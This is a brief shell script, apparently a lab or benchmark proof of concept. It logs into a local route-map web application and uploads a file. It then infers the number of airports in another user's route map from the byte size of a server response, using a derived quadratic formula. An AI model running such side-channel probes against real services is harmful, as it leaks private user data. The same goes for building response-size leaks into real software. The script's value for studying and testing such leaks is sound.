#!/bin/sh

./login.sh usr pwd

# upload a route map
curl -s -L -b cookies.txt -F file=@user.txt -F "route_map_name=user" --insecure https://localhost:8443/add_route_map > /dev/null

user=`curl -s -b cookies.txt --insecure https://localhost:8443/passenger_capacity_matrix/1553932502 -w '%{size_download}\n' | tail -n1`

echo "User response= $user"
# uses the hacker 3207 baseline
solution=$(echo "(-34+sqrt(34*34-40*(3163-$user)))/20" | bc)
# this formula was derived from: 
# baseline+64*(n-1)+20*(n-1)*(n-2)/2 where: 
# baseline= hacker resposne with 1 airport (3207)
# n= number of airports from the user
echo "Hacker side-channel using formula (-34+sqrt(34*34-40*(3163-user)))/20 = $solution airports"
